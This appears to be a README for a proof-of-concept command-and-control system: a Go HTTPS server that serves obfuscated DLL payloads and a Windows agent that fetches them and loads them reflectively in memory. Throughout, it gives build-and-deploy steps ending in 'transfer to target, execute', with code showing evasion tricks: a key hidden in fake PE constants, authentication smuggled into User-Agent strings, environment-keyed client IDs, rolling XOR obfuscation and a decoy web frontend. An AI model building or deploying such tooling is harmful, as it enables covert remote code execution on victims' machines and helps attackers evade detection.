## example reflective loader server + agent
A simple C2 proof-of-concept channel highlighting use of a reflective loader agent, plus a rolling key derived from a shared secret and request parameters for obfuscation.
This system consists of two main components:
**C2 Server**: HTTPS server that delivers obfuscated DLL payloads to authenticated clients.
**Reflective Loader Client**: Windows agent that downloads, deobfuscates, and executes DLLs directly in memory without touching disk.

## instructions
### create source file
- Here using dll that has a single explorted function LaunchCalc() that injects + executes shellcode to launch calc.exe
- See ../dll_shellcode_loader/dll_shellcode_loader/dll_calc.dll for an example
- Copy dll to ./server as `*.bin` format

### generate self-signed certs
- And place in `/server/certs`
```shell
# Generate private key
openssl genrsa -out server.key 2048

# Generate self-signed certificate 
openssl req -new -x509 -key server.key -out server.crt -days 365 -subj "/CN=update-server.local"
```

### configure server settings
- See `./server/config.json`

### run/compile server
- See `server/main.go`
- Use go build or go run

### compile agent, transfer to target, execute
- Compile agent for Windows
```shell
GOOS=windows GOARCH=amd64 go build
```
- Transfer to target, execute.
- Verified to work on Win 11 x64


## Server Overview
- Disguised Key Derivation: The encryption key is constructed from constants that appear to be legitimate PE file format values, making static analysis more difficult
- Parameter Extraction: Client parameters are extracted from standard User-Agent headers, blending C2 traffic with normal HTTP
- Environmental Keying: Authentication incorporates system-specific information, ensuring payloads only execute in intended environments
- Rolling Encryption: The XOR key changes for each byte position, preventing pattern analysis
- Plausible Web Server: Provides a convincing web frontend for non-targeted visits
- Authentication: Validates clients through timestamp and environmental parameters

## Agent Overview
- Memory-Only Execution: Loads and executes DLLs entirely in memory without writing to disk
- Environmental ID: Generates unique but predictable client IDs from system properties 
- Custom User-Agent: Embeds authentication parameters in standard HTTP headers 
- Function Resolution: Dynamically resolves and calls exported functions from the loaded DLL
- Shared Secret Recovery: Reconstructs the same obfuscation key as the server using common parameters

Manual PE Loading: Implements the entire Windows PE loader in custom code, including:
- PE header parsing and validation
- Memory allocation at preferred base address
- Section mapping with correct permissions
- Import Address Table (IAT) resolution
- Base relocations when needed
- Proper DllMain calling convention


## breakdowns
### Obfuscated Key Derivation
```go
// These appear to be PE file format constants but are actually our obfuscated key components
const (
    SECTION_ALIGN_REQUIRED    = 0x53616D70  // Actually "Samp" in ASCII
    FILE_ALIGN_MINIMAL        = 0x6C652D6B  // Actually "le-k" in ASCII
    PE_BASE_ALIGNMENT         = 0x65792D76  // Actually "ey-v" in ASCII
    IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565  // Actually "alue" in ASCII
)
```
These constants appear to be legitimate PE format values but actually encode the string "Sample-key-value". The values are retrieved through functions that look like they're performing PE validation operations but are actually constructing the key.

### Rolling XOR Encryption
The payload encryption uses a rolling XOR key that incorporates both the shared secret and the byte position:

```go
for i := 0; i < len(data); i++ {
    // Calculate rolling key byte: combines key byte with position
    keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)
    
    // XOR the data byte with the rolling key byte
    result[i] = data[i] ^ keyByte
}
```
This prevents identical plaintext patterns from appearing as patterns in the ciphertext, making cryptanalysis more difficult.

## Authentication Parameters fronting as User-Agent strings
The client embeds authentication parameters in the User-Agent string:
```go
customUA := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "+
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 rv:%s-%s",
    timestamp, clientID)
```
This makes the C2 traffic blend with regular web browsing, as the parameters appear to be legitimate browser version information.

### Environmental Keying
The client generates its ID using hardware-specific information that persists across reboots:
```go
// Get volume serial number and hostname
var volumeSerial uint32
windows.GetVolumeInformation(
    windows.StringToUTF16Ptr("C:\\"),
    &volumeName[0],
    uint32(len(volumeName)),
    &volumeSerial,
    nil, nil, nil, 0,
)

// Format: <first 5 chars of hostname>-<volume serial>
clientID := fmt.Sprintf("%s-%x", shortName, volumeSerial)
```

###  In-Memory PE Loading Process
The reflective loader parses and loads the DLL manually using these steps:

1. Parse PE Headers: Extract information about sections, imports, exports, and entry points
2. Allocate Memory: Request executable memory at the DLL's preferred base address
3. Map Sections: Copy each section to its correct relative virtual address (RVA)
4. Process Relocations: Adjust addresses if the DLL couldn't load at its preferred base
5. Resolve Imports: Find and link all imported functions from other DLLs
6. Call DllMain: Initialize the DLL with DLL_PROCESS_ATTACH
7. Find Exports: Locate the target function to execute
8. Execute Function: Call the exported function directly in memory